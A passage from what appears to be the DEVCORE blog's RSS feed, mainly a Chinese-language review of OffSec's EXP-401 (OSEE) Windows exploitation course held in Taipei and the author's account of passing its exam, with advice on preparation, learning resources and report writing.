  &lt;li&gt;&lt;strong&gt;WEB-300:&lt;/strong&gt; Advanced Web Attacks&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;EXP-401:&lt;/strong&gt; Advanced Windows Exploitation&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If you’re interested, I recommend registering early. Early bird pricing is much cheaper and the price increases over time.&lt;/p&gt;

&lt;p&gt;More info: &lt;a href=&quot;https://training.devco.re/2025&quot;&gt;DEVCORE &amp;amp; OffSec Live Training 2025&lt;/a&gt;
&lt;img src=&quot;/assets/img/blog/20250522/upload_b7cab66943df4921db18bbd3c37487f8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2025/05/27/osee-exam-uncovered-cracking-osee-in-taipei/</link>
                <guid>https://devco.re/blog/2025/05/27/osee-exam-uncovered-cracking-osee-in-taipei</guid>
                <pubDate>Tue, 27 May 2025 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>EXP-401 (OSEE)：用五天課程訓練通透十年的知識體系</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2025/05/27/osee-exam-uncovered-cracking-osee-in-taipei/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2025/05/22/exp-401-osee-five-days-to-master-a-decade-of-knowledge/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;

&lt;p&gt;2024 年 8 月，DEVCORE 跟 OffSec 在台北辦了一場 Live Training，總共有四門課可以報名：SOC-200、WEB-200、PEN-200、EXP-401，這是第一次看到 OffSec 在台灣辦 Live Training。當然，其中我最感興趣的肯定是 EXP-401，也叫做 Advanced Windows Exploitation（AWE），更多人知道的是他的證照名稱「OSEE」。&lt;/p&gt;

&lt;p&gt;OSEE 是 OffSec 裡面最難的一張證照，截至目前為止，全球大約只有只有一到兩百人，通過率甚至只有 10% 左右。我們一直很想挑戰看看這張傳說中的證照到底有多難，不過就是一張證照到底是能難到哪裡去？&lt;/p&gt;

&lt;p&gt;在 DEVCORE，我們很早就開始統計，如果台灣有機會上 OSEE，究竟有多少人想去？那時候我的第一個念頭就是：「就算自費也要上！」原因很簡單：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;OSEE &lt;strong&gt;僅提供現場授課&lt;/strong&gt;，完全沒有線上版。&lt;/li&gt;
  &lt;li&gt;過去要上這門課，&lt;strong&gt;一定得出國&lt;/strong&gt;，最有名的場次就是每年 Black Hat USA 的現場課程。&lt;/li&gt;
  &lt;li&gt;報名非常困難，常常開放沒多久就額滿，甚至有人寫 script 搶名額。&lt;/li&gt;
  &lt;li&gt;不論考試結果如何，都能成為台灣第一個：第一張 OSEE，或第一個 OSEE 不及格，也都算是一種解成就了。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;OffSec 官方網站有一個頁面專門用來公布實體訓練課程： &lt;a href=&quot;https://www.offsec.com/training-and-events/&quot;&gt;Upcoming Live Training &amp;amp; Events | OffSec&lt;/a&gt;。而 EXP-401 最廣為人知的場次，就是每年 8 月在拉斯維加斯 Black Hat USA 會場舉辦的 Live Training。粗算一下，從台北飛到拉斯維加斯的來回機票，加上上課期間的住宿費，至少要花上一大筆錢。因此，能在台北上課，光是省下的旅費就超過十萬，簡直是賺到。&lt;/p&gt;

&lt;p&gt;總結來說，我認為這是目前看過最棒的訓練課程，非常推薦參加。即便不是專門做 Windows 研究的人，也能從中獲得很多樂趣。上課的目標不必設定在拿到 OSEE 證照（當然，如果考過會更爽），光是上課本身，就已經是一段超棒的體驗了。&lt;/p&gt;

&lt;h2 id=&quot;介紹&quot;&gt;介紹&lt;/h2&gt;

&lt;p&gt;EXP-401（OSEE）是 OffSec 中唯一的「Expert」等級課程，也是公認最困難、通過率最低的證照，具體可以參考  Paul Jerimy 整理的 &lt;a href=&quot;https://pauljerimy.com/security-certification-roadmap/&quot;&gt;Security Certification Roadmap&lt;/a&gt; ：
&lt;img src=&quot;/assets/img/blog/20250522/upload_8c455085eb6be1da05d6f11ed8b5ad8a.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;EXP-401（OSEE）針對的是&lt;strong&gt;進階 Windows 漏洞利用技術&lt;/strong&gt;，由於現代 Windows 系統有許多安全防禦機制（像是 DEP、ASLR、CFG、ACG、CET 等），課程將一步步帶領學員&lt;strong&gt;繞過這些防禦措施&lt;/strong&gt;，並針對單一或多重保護環境，開發出實際可行的 exploit。課程有幾個特色：&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;實體授課&lt;/strong&gt;：此課程與 OffSec 的其他課程都不同，並沒有線上課程的方案，因為這堂課的講師需要透過與學員大量的互動來進行指導，所以需要學員到現場上課。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Real World 導向&lt;/strong&gt;：上課內容是以真實世界企業會採用的大型應用程式作為分析對象，例如：VMware、Edge 等等。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;深入 Windows&lt;/strong&gt;：涵蓋 User Mode 與 Kernel Mode 的漏洞發掘與利用、進階 Heap 操作、VM Escape、Sandbox Escape 與 Kernel Driver 的逆向和漏洞分析等。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;72 小時考試挑戰&lt;/strong&gt;：OSEE 是 OffSec 中考試時間最長的證照。考試僅有兩題，皆為未知漏洞，學員需在 72 小時內開發出完整的 exploit 並繳交一份&lt;strong&gt;完整詳盡的滲透測試報告&lt;/strong&gt;，包含步驟說明與截圖。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;雖然課程官網推薦學員熟悉 WinDBG、IDA Pro、x86/x64 組合語言、C/C++，但上完課後，我感覺只要會這些東西的基本操作就可以了。因為課程中並沒有過於刁鑽的場景，而且需要進行逆向工程的地方都滿單純的，整個課程也都不需要使用 IDA Pro 的 decompile 功能。整體來說，這門課的重點還是放在 &lt;strong&gt;exploit 的撰寫與技巧應用&lt;/strong&gt;，而非深入逆向分析。因此相較於純逆向技能，有過 &lt;strong&gt;binary exploitation 經驗（不論是 Windows 還是 Linux）會對學習過程有更大的幫助。&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;課程前準備&quot;&gt;課程前準備&lt;/h2&gt;

&lt;p&gt;在報名完成後會收到 OffSec 寄來的行前通知，內容包含了課程的硬體與軟體需求。例如，為了確保學員有辦法練習到課堂上提到的保護，會需要電腦支援 NX、SMEP 與 VT-x/EPT。而且因為課程中有 VMware 相關的內容，需要啟用巢狀虛擬化之外還要確保硬碟空間與 RAM 的大小足夠（不過新版的課程移除 VMware 了）。我個人會推薦另外帶一個攜帶式的外接螢幕去上課，因為在對虛擬機進行 remote debugging 的同時，還需要看上課簡報或是在 Visual Studio 中修改 exploit，如果一直切來切去是會滿分心的。&lt;/p&gt;

&lt;p&gt;除此之外，行前通知中還包含了很多課前準備資料，包含了很多上課中會提到的概念以及手法的粗淺介紹，諸如：Bypassing DEP、Bypassing ASLR、Bypassing CFG、Windows Mitigations Improvements、Type Confusion Vulnerabilities、SMEP、Token Stealing、Low Fragmentation Heap 等等各種事前預習資料。&lt;/p&gt;

&lt;h2 id=&quot;上課狀況&quot;&gt;上課狀況&lt;/h2&gt;

&lt;p&gt;這次課程是連續五天的實體課程，每天從早上 9:00 上到晚上 18:00，上課地點在北科大的集思會議中心。一走進教室就看到桌上擺著一本超大的課本。
&lt;img src=&quot;/assets/img/blog/20250522/upload_ab82acf8bee146b377b3bc70ff60b756.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;這本課本到底有多大呢？內容大約六百頁，厚度大約 3.6 公分：
&lt;img src=&quot;/assets/img/blog/20250522/upload_17fdc7d6f806d28d3cb313584b4fe4ec.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;簡單來說，就是有夠大本。&lt;/p&gt;

&lt;p&gt;上課期間，每天都有提供各種食物和點心，除了學習以外的事情一律都不需要擔心。這次的講師是 &lt;a href=&quot;https://dz.linkedin.com/in/nassereddine-abdelli?trk=public_post_feed-actor-name&quot;&gt;Nassereddine ABDELLI&lt;/a&gt;（&lt;a href=&quot;https://x.com/n4sr0&quot;&gt;@n4sr0&lt;/a&gt;）與 &lt;a href=&quot;https://lb.linkedin.com/in/victor-khoury&quot;&gt;Victor Khoury&lt;/a&gt;（&lt;a href=&quot;https://github.com/V-i-x-x&quot;&gt;Vixx&lt;/a&gt;），兩位講師都非常的有經驗，跟學員的互動非常的多，時常會拋出問題來確認學員是不是都有理解課程進度。即使學員問一些講師沒有預期到的問題，他們也都能當場實際操作並解答，驗證並回答學員的問題，完全發揮了 Live Training 的優點。&lt;/p&gt;

&lt;p&gt;在五天的課程中，還設計了幾個名為 Extra Miles 的挑戰，只要能在 Live Training 期間完成，就能獲得一枚 Challenge Coin，總共有兩個這樣的 Challenge。課堂上也有一些小型問答活動，答對的話可以拿到貼紙。&lt;/p&gt;

&lt;p&gt;有趣的是，在第一天快要結束的時候，講師好像心血來潮自己增加了一個 challenge：45 分鐘內成功搞定 ROP chain ，就能拿到 Challenge Coin。不過，因為時間太趕了沒有人完成。當時 Orange 還是 Lays 就開玩笑的說：「幾乎全台灣的微軟百大駭客都在這裡了，竟然沒人解得出來。」看來 OSEE 是真難。&lt;/p&gt;
&lt;h3 id=&quot;day-1&quot;&gt;Day 1&lt;/h3&gt;

&lt;p&gt;第一天上課講師先把投影片還有一堆上課會用到的 VM 先傳給大家，然後開始對課程做簡單的介紹。網路上最多人提到的應該就是這一張投影片：
&lt;img src=&quot;/assets/img/blog/20250522/upload_7b077d2f6c8d86426a5aa31a1876449b.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;這張投影片預告了接下來課程難度是怎樣跳躍的，但我個人覺得沒有這麼誇張，可能是因為課程裡的主題本來就是漏洞研究員平常會碰到的東西（VM、Browser、Kernel），也有可能是因為 CTF 選手本來比較耐操。&lt;/p&gt;

&lt;p&gt;一個比較有趣的小彩蛋是，投影片上方畫了一個日本武士，隨著課程的進行，武士的裝備會越來越降級。例如，頭盔會變成斗笠，武器跟鎧甲也會慢慢消失，最後會變成一個裸男。應該是寓意著理解 Windows 的過程將會充滿挑戰！&lt;/p&gt;

&lt;p&gt;雖然課程本來就建議要具備一定的 Windows 相關知識，但還是不免俗的先講了一些簡單的東西暖暖身，如 Win32 API 跟 x64 shellcode 相關的內容。但是下半天開始就慢慢進入 VMware 的內容了。首先介紹了一些基礎的防護機制以及如何用 ROP 繞過這些保護，接著會介紹 VMware Workstation 的一些內部運作機制還有結構。&lt;/p&gt;

&lt;p&gt;這部分讓我印象很深刻的是，從講義內容可以看得出來，編寫這本講義的團隊是一群很有水準的研究員。講義就是這些研究員細心研究、整理後產出的結晶，因此課本裡面充滿了各種 Reference。如果對原始研究有更多興趣，只要順著講義提供的參考資料，就能很容易找到更深入的閱讀材料。&lt;/p&gt;

&lt;h3 id=&quot;day-2&quot;&gt;Day 2&lt;/h3&gt;

&lt;p&gt;第二天持續 VMware Workstation 的課程，因為課堂上的例子是與 Heap 相關的漏洞，所以先花了一點篇幅介紹 Windows Heap 的整體架構，為後續撰寫 exploit 打好基礎，屆時可以更好的控制 Heap。&lt;/p&gt;

&lt;p&gt;接著課程進入 Bypassing ASLR、Stack Pivoting、Defeating DEP 等等內容。從這裡開始，可以明顯感受到這門課的實用價值。通常在 CTF 比賽中，我們只在乎能不能拿到 Flag，不特別追求 exploit 的穩定性；在  Pwn2Own 等比賽中，重點則是能不能穩定取得 Shell，只要「One Shot」即可，後續系統會不會 crash 並不是太大問題。但在這門課中，學員會被要求要把程式回復到正常的狀態。也就是說，無論是 VMware Workstation 與 Windows ，在 exploit 執行完之後都不能出現 crash 或當機，必須像什麼事都沒發生過一樣繼續運作。（當然，不接受使用 while loop 或 sleep 卡住程式來「作弊」）&lt;/p&gt;

&lt;p&gt;下半天，內容逐漸進入到 Edge Browser 的部分。不過這邊教的還是 Chakra 版本的 Edge，而不是現行的 Chromium 版本。講師提到，選擇 Chakra 版是因為這個版本啟用了更多 Windows 原生的保護機制，選擇舊版的 Edge 反而可以練習到更多 Windows 的 exploit 技巧，更符合這門課「Advanced Windows Exploitation」的定位。實際上要在這門課中真正學好 Browser pwn 確實也是不可能的，要想追上最新版的細節或漏洞研究趨勢，那會是另一個龐大到可以開成一整門課的主題，不是 Advanced Windows Exploitation 這門課需要追求的。但即便如此，我們還是學到了許多關於 Browser Exploit 的核心概念，例如 Type Confusion、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addressof&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fakeobj&lt;/code&gt; 等技巧，以及重要的 Debugging 流程。&lt;/p&gt;

&lt;p&gt;雖然 Browser 的部分還沒開始太多，但今天講師還是給了第一個 Extra Mile：&lt;strong&gt;使用 ROP 繞過 CFG（Control Flow Guard）保護，完成 Sandbox Escape 的 exploit&lt;/strong&gt;（課堂上教是 CET（Control-Flow Enforcement Technology）啟用的情境，屆時連 ROP 都無法成功）。聽起來很簡單，但講師還特別要求，我們必須把漏洞包裝成一個可以無限次觸發 ROP 的 function，讓 exploit 開發過程更加有紀律，也能提升開發效率。&lt;/p&gt;

&lt;p&gt;當然，這中間還有其他難點需要解決，像是如何取得可用的記憶體位置等等。但是因為我真的很想拿到 Challenge Coin，所以我一個晚上看了一兩百頁還沒有教到的地方，先把要做什麼事情釐清之後就開始寫這個 exploit。&lt;/p&gt;

&lt;h3 id=&quot;day-3&quot;&gt;Day 3&lt;/h3&gt;

&lt;p&gt;第三天的課程整天都聚焦在 Edge 上，這是我覺得這門課最有趣的部分。&lt;/p&gt;

&lt;p&gt;從 Type Confusion 漏洞開始，講師帶我們一步步透過操控 Edge 中的 Javascript 物件來控制 RIP。接著，課程進入各種防護機制的介紹，每啟用一種新防護，就馬上教我們怎麼設法繞過它。我們先是繞過 CFG（Control Flow Guard），接著 Control-Flow Enforcement Technology（CET），接著 Arbitrary Code Guard（ACG），最後則是從 Browser 的低權限 Sandbox 逃脫到 Windows 執行高權限的指令。&lt;/p&gt;

&lt;p&gt;過程中不只學習的現代 Windows 存在怎樣的保護機制之外，對每種保護機制的局限性以及繞過手法也有很深刻的認識！&lt;/p&gt;

&lt;p&gt;當然，雖然上課內容跟 Extra Mile 走的路線不完全相同，我還是在課堂進行中完成了那個 ROP Sandbox Escape 的 Extra Mile，順利拿到了這次課程發出的&lt;strong&gt;第一枚 Challenge Coin&lt;/strong&gt;！雖然這編號看起來有點不吉利（Challenge Coin 沒有按照編號順序發）：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250522/upload_83ad2122816ba37db84d7750df28350a.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在今天下課之前，講師也給出了這門課最後一個 Extra Mile 挑戰，這次是跟後面即將上到的 Kernel Mode 課程內容有關：在 Low Integrity 的情境下完成某個 CVE 的漏洞利用最後執行高權限的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmd.exe&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;這邊的難點在於因為是 Low Integrity 所以無法直接使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtQuerySystemInformation&lt;/code&gt; 來洩漏 Windows Kernel 的記憶體位置，需要透過其他漏洞來迂迴的取得我們想要的 Kernel 記憶體位置。而且，由於課堂中給的 CVE 需要寫檔案才能完成漏洞利用，我們還需要找一個 Low Integrity 也能寫入的資料夾才能順利放置 exploit 所需的檔案並完成利用。&lt;/p&gt;

&lt;h3 id=&quot;day-45&quot;&gt;Day 4、5&lt;/h3&gt;

&lt;p&gt;前幾天的課程主要聚焦在 Windows User Mode 的保護機制與漏洞利用，到了最後兩天，則專注在 Kernel Mode 的內容。我們學習了有關 Kernel Driver 以及 Win32k 的漏洞利用，涵蓋了大量作業系統相關知識以及 Kernel 獨有的攻擊技巧，如：Token Stealing、ACL NULL-ing、SMEP、Page Table、KVA Shadow、Desktop Heap、Virtualization-Based Security、kCFG 等等。在 Kernel 層級，我們更需要特別注意漏洞利用的穩定性，以及如何在完成利用後將系統恢復到正常狀態，而不是直接讓系統 Crash。&lt;/p&gt;

&lt;p&gt;雖然這堂課長達五天，但隨著時間推進，感覺大家越來越興奮。Lays 說，可能是因為平常根本沒人在乎 Windows，現在有一門課五天都在講這個東西就很爽。到了後面，上課時幾乎所有人都興奮地站著看講師操作 WinDBG 及修正 exploit，氣氛一直熱烈到課程結束。&lt;/p&gt;

&lt;p&gt;當然，最後我順利拿到了兩枚 Challenge Coin。不過聽同事說，有國外的學員在心得文中提到，因為課堂上拿到了兩枚 Challenge Coin，太過自信，結果考試時沒有充分準備，聽得我都有點緊張了。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250522/upload_29009efc9ab35f26cdb952f962900dfb.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;感想&quot;&gt;感想&lt;/h2&gt;

&lt;h3 id=&quot;完整的體驗&quot;&gt;完整的體驗&lt;/h3&gt;

&lt;p&gt;一週的實體訓練課程帶來了極佳的心流體驗。這五天的生活，除了 Windows 的 exploit 之外就沒別的東西了，加上 Extra Miles 的獎勵機制，可以說是連做夢都在寫 exploit，精神狀態直接變成 Windows 的形狀。而且為了確保系統的穩定性還有開發的速度，從一開始就必須認真思考，選擇最適合的方式來完成 exploit，以便後續作業能更輕鬆。同時，也必須建立良好的 coding 習慣，這不僅能在除錯過程中提升可讀性，也能在後續維護時，減少出錯的機率，並節省釐清概念所需的時間。&lt;/p&gt;
&lt;h3 id=&quot;學習資源&quot;&gt;學習資源&lt;/h3&gt;

&lt;p&gt;後續有不少人私訊詢問 EXP-401 這堂課是否有建議的 learning path，例如是否應該先修哪些課程，或是否有推薦的預習資源。老實說，我覺得課程本身就足夠了，不太需要額外找其他資源來準備。不過，如果你還在考慮自己是否適合這堂課，可以先從以下幾個免費資源開始：&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/hacksysteam/HackSysExtremeVulnerableDriver&quot;&gt;HackSys Extreme Vulnerable Driver (HEVD)&lt;/a&gt;：這個專案提供了許多設計來練習的有漏洞的 Windows Driver。不過因為是 Driver，主要練習的是 Kernel Mode 的保護機制、漏洞發現與利用方法。&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://p.ost2.fyi/&quot;&gt;OpenSecurityTraining2&lt;/a&gt;：這個網站上有許多資安研究員無償製作的免費課程，不僅包含 Windows 相關課程，也有許多基礎課程，例如：x86-64 OS Internals、Introductory WinDbg 等。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;這些資源都是非常知名且品質有保障的免費教材，維護者本身要不是現職資安研究員，就是同時也有在開設付費課程的專業人士。就我所知，許多初學者在早期學習時期就是靠這些資源打基礎。（不過我個人沒有完整使用過這些資源，總時數不超過兩個小時。）&lt;/p&gt;

&lt;p&gt;或者，假設你的程度比較進階一點，那其實可以考慮直接找網路上有 Write-up 的 1-day 復現。像這堂課中提到的某個 Win32k 漏洞，我其實一兩年前就寫過完整的 exploit，雖然當時做得還不夠穩定。Angelboy 也寫過一些課程中提到、難度比較高的漏洞利用。這種實作練習非常有幫助，因為過程中會經歷到 exploit 開發的各個步驟：搜集資料、定位漏洞位置、保護機制的繞過、Windows 的特殊機制等等。&lt;/p&gt;

&lt;h3 id=&quot;課程本身的價值&quot;&gt;課程本身的價值&lt;/h3&gt;

&lt;p&gt;這門課可以說是 OffSec 精心提煉後的一帖大補藥，不僅將 Windows 各種保護機制系統性地整理起來，還涵蓋了許多在公開資源中難以找到的細節。做研究的人應該都能體會：我們或許知道某個保護機制或系統設計的存在，但要深入了解它們背後的具體實作，往往需要自己從零開始，收集零碎的資料、分析程式碼、花費大量時間反覆推敲。&lt;/p&gt;

&lt;p&gt;在理解一個大型系統時，通常也會遇到類似的情況：系統中存在許多重要的角色與機制，但相關研究往往散落在過去十幾年的資料中。第一步，要先花時間搜尋並整理過去十年的研究，逐步釐清各個角色之間的互動關係，進而理解它們在什麼條件下會失效，最終才能拼湊出一個完整的故事。而這種從大量資料中梳理出來的研究成果，通常是不會輕易對外分享的。&lt;/p&gt;

&lt;p&gt;而 EXP-401，正是把這樣等級的研究成果濃縮成課程內容，毫無保留地分享給學員。從最早期的 DEP 保護機制開始，各種保護機制接著一層層的堆疊上去，EXP-401 在課程中就一步步帶你走過這整個歷史軌跡。每一層防護是為了解決什麼樣的問題？又是如何被攻擊者逐步繞過？課程不只是講理論，還結合具體漏洞案例，教你如何實際避開這些防護機制。&lt;/p&gt;

&lt;p&gt;到課程結束時，學員腦中已經構築出一幅清晰的 Windows 藍圖。每個保護機制的出現背景、運作方式、可能的弱點與對應的利用方法，都能一一連結起來。這不只是單純的提升了撰寫 exploit 的能力，而是真正掌握了 Windows 系統內部運作的脈絡與故事。&lt;/p&gt;
&lt;h3 id=&quot;課程內容依然適用嗎&quot;&gt;課程內容依然適用嗎&lt;/h3&gt;

&lt;p&gt;EXP-401 的課程設計主要圍繞在 Windows 的保護機制與漏洞利用方法上，內容並未過多著墨於那些已經被淘汰的技術。因此，課程中介紹的各種保護機制，基本上都是目前 Windows 系統中仍然存在且有效的防護措施。&lt;/p&gt;

&lt;p&gt;除了講解保護機制本身，課程也搭配了許多輔助教材。不過，這些教材的主要目的是為了說明各種情境，並促進學員對漏洞利用方法的思考。例如，以課程中使用 Chakra 引擎版本的 Edge 瀏覽器來說，使用 Chakra 版本的 Edge 當然不貼近現實，因為沒有人在使用它了，但從 Windows 系統保護機制的角度來看，這樣的範例依然相當適用。因為無論是哪一款瀏覽器，只要出現漏洞，開發 exploit 時所面對的系統層面問題基本上是一致的。&lt;/p&gt;

&lt;p&gt;當然，在「瀏覽器範圍內」要解決的問題是不一樣的，像 Chrome 就會多出一層自己設計的 Sandbox 機制，這是應用程式層面的額外挑戰。但必須理解，除非這門課叫做 Browser Exploit Development，否則你不應該預期在這堂課上獲取太多瀏覽器特有防護機制相關的知識。&lt;/p&gt;

&lt;p&gt;總結來說，如果只聚焦在 Windows 系統本身的保護機制與漏洞利用技巧上，EXP-401 的課程內容在今天依然非常適用。&lt;/p&gt;

&lt;h3 id=&quot;對找工作有幫助嗎&quot;&gt;對找工作有幫助嗎&lt;/h3&gt;

&lt;p&gt;這是許多人關心的問題。我的回答是：&lt;strong&gt;有幫助，但影響不大。&lt;/strong&gt; 為什麼這麼說呢？&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;如果你想成為一名紅隊演練專家：&lt;/strong&gt; 在沒有紅隊相關證照的情況下，僅持有 OSEE 並不能證明什麼。雇主更在意的是你是否具備完整的紅隊演練思維（mindset），而不是你有能力在 Windows 上面開發 exploit。當然，如果兩者兼備，肯定是非常加分的。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;如果你想成為一名資安研究員：&lt;/strong&gt; 這門課的內容僅能視為入門等級。取得 OSEE 證照，頂多證明你有能力處理某些基本的技術問題。但在真正的研究工作中，更重要的是：你能不能自己主導一個研究？能不能獨立解決研究過程中遇到的各種問題？&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;因為我是資安研究員，所以想更深入聊聊第二點。如果你想成為一名真正的研究員，那事實上你並不需要任何證照，沒有任何證照可以直接證明一個人研究的品質。真正的能力，需要透過累積實績、發表成果來證明。&lt;/p&gt;

&lt;p&gt;當然，在累積實績之前，必然會有一段時間不短的，紮實學習、反覆撞牆的過程。從這個角度來看，&lt;strong&gt;EXP-401 的價值，在於幫助你快速且有系統地建立起必要的基礎知識。&lt;/strong&gt; 對於這門課最淺白的理解是：「快速準備好 Windows 研究所需的技術背景」。但實際上，EXP-401 的價值不僅止於此。EXP-401 的上課過程更像是「臨摹大師名作」，跟隨過去頂尖研究員的腳步，從新保護機制的推出、理解到繞過，學習這個過程中需要掌握的工具、技巧，以及如何有效提煉出關鍵資訊。雖然課程主題圍繞在 Windows 上，但背後訓練的思考模型與研究方法卻不僅止於 Windows，這些能力是可以被應用到 IoT、Linux、macOS 等其他領域的。&lt;/p&gt;

&lt;p&gt;所以我個人認為這堂課的價值比起證照本身更高，但當然，付一樣的錢還是把證照一起拿走比較賺。&lt;/p&gt;

&lt;h2 id=&quot;考試與報告撰寫&quot;&gt;考試與報告撰寫&lt;/h2&gt;

&lt;p&gt;如同前面說的，OSEE 考試一共有兩題。OffSec 為此設計了一系列漏洞，並且為了貼近現實，每個漏洞都有對應的 CVE Advisory 和模擬的部落格文章。部落格文章主要介紹程式的運作機制和過去漏洞利用的方法，而 CVE Advisory 雖然會描述漏洞類型，但並不會具體指出漏洞位置、觸發方式，也不會提供 PoC。考生必須依靠這些線索，自行逆向分析，找出漏洞所在，撰寫可觸發漏洞的程式，最終在繞過所有保護機制後，讀取 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proof.txt&lt;/code&gt; 檔案，才算完成挑戰。&lt;/p&gt;

&lt;p&gt;考試時間安排為：&lt;strong&gt;72 小時內完成 exploit，24 小時內完成報告&lt;/strong&gt;。但實際操作時，時間遠沒有表面上那麼充裕，這點稍後會解釋。&lt;/p&gt;

&lt;p&gt;具體評分標準可參考 OSEE 官方提供的報告模板：&lt;a href=&quot;https://offensive-security.com/awe/AWE-Exam-Report.docx&quot;&gt;AWE-Exam-Report.docx&lt;/a&gt;。每一題的分數都是 50 分，但若只完成某題的一半，僅能獲得 25 分，而合格分數為 75 分。例如，以報告模板中的第一題來說，若只做到 Code Execution，卻無法完成 Sandbox Escape，就只能拿 25 分；第二題若僅做到 Read/Write Primitive，但未成功提升權限，同樣只能拿 25 分。&lt;/p&gt;

&lt;p&gt;雖然我在去年八月就上完課，但是因為超級忙的所以根本就沒辦法安排考試。九月、十月主要忙著研究 Pwn2Own 的目標（最後成功打下 AeoTec），年底則是準備 CCC 的演講，年初接著是 SITCON 和三月的 DEVCORE Conf。但最後還是勉強在 2/24 塞了一個 OSEE 考試。&lt;/p&gt;

&lt;p&gt;當天早上八點開考，第一題很快就弄出  Code Execution 拿到 25 分。不過因為一個小地方沒注意，卡在 Sandbox Escape 做不出來。所以第二天先跳去第二題看看，下午兩點左右就把題目解掉，拿了 50 分；剩下半天繼續磨第一題，終於在半夜兩點破台。原本大家還在講說要搶台灣第一張 OSEE，但我現在覺得應該要玩「OSEE Speedrun」才有意義。這幾天我基本上還是正常生活（扣除一直有台 webcam 會照著你的部分，還算正常），還有空練琴，如果第一天不要耍白痴的話，好像真的有機會一天解完。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;時間線
    &lt;ul&gt;
      &lt;li&gt;2/24 08:00:00：早上八點開始考試&lt;/li&gt;
      &lt;li&gt;2/25 14:04:52：解掉第二題&lt;/li&gt;
      &lt;li&gt;2/26 02:41:43：解掉第一題，破台&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;接下來剩下的時間，就是用來專心撰寫報告。
前面提到，考生必須在 &lt;strong&gt;72 小時內完成 exploit&lt;/strong&gt;，並在接下來 &lt;strong&gt;24 小時內完成報告&lt;/strong&gt;。但實際上，時間根本沒那麼充裕，原因在於 OSEE 的報告要求非常嚴格。&lt;/p&gt;

&lt;p&gt;以官方提供的範本 &lt;a href=&quot;https://offensive-security.com/awe/AWE-Exam-Report.docx&quot;&gt;AWE-Exam-Report.docx&lt;/a&gt; 為例，可以發現整份報告的結構被劃分得非常細緻，比如：「2.2 Initial Exploitation」、「2.3 Read and Write Primitive」、「2.4 Code Execution」、「2.5 Sandbox Escape」等等。&lt;/p&gt;

&lt;p&gt;平時自己寫 exploit，通常都是順順寫到底，很少會特意去紀錄中間每個細節。但在考試中，必須清楚拆解每一個階段，不僅要說明自己是怎麼利用漏洞的，還必須具體證明自己繞過了哪些保護機制，並且附上可以直接複製貼上就能夠執行的程式碼。例如，「Read and Write Primitive」這個階段，平常我們可能只是在開發過程中確認一下就繼續推進了，很少會特別停下來做獨立驗證。但在報告中，你必須證明自己具備這個能力。常見的做法是撰寫小型 PoC，讀寫一塊不可存取的記憶體，並搭配 Debugger 截圖作為佐證。&lt;/p&gt;

&lt;p&gt;然而，&lt;strong&gt;考試機器只開放 72 小時使用，而且所有資料都禁止下載&lt;/strong&gt;。這表示：如果 72 小時內沒有收集齊全所有必須的截圖、證據和中間過程，之後在寫報告時就會非常痛苦，甚至可能因為證據不足導致無法通過。因此，在寫報告時才去拆分每個階段的 PoC 是不可能的，因為這樣會缺少必要的截圖，甚至無法驗證 PoC 是否能正常執行。最保險的策略是：&lt;strong&gt;在 72 小時內，不只是完成 exploit，也要同步撰寫 PoC，收集完所有資料，並把報告的主要內容草擬出來。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;而且真的有人因為報告不夠詳盡，即使在解題階段拿了 100 分也沒有通過，所以我嚇得直接交了一百頁的報告出去。&lt;/p&gt;
&lt;h2 id=&quot;結語&quot;&gt;結語&lt;/h2&gt;

&lt;p&gt;把所有 exploit 和報告都整理好交出去之後，就只剩等待 OffSec 公告考試結果了。官方說審核可能需要最多十個工作天，我一路等到了 3 月 10 號，終於收到通過的通知。
據說這是全台灣第一張 OSEE 證照，算是順利解鎖了一個成就：
&lt;img src=&quot;/assets/img/blog/20250522/upload_b03d6106afb193bc29194272198cf43b.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;另外，今年八月，DEVCORE 也將繼續承辦 OffSec 的 Live Training。  今年開設的課程包括兩門 Advanced 等級和一門 Expert 等級的課程，分別是：&lt;/p&gt;
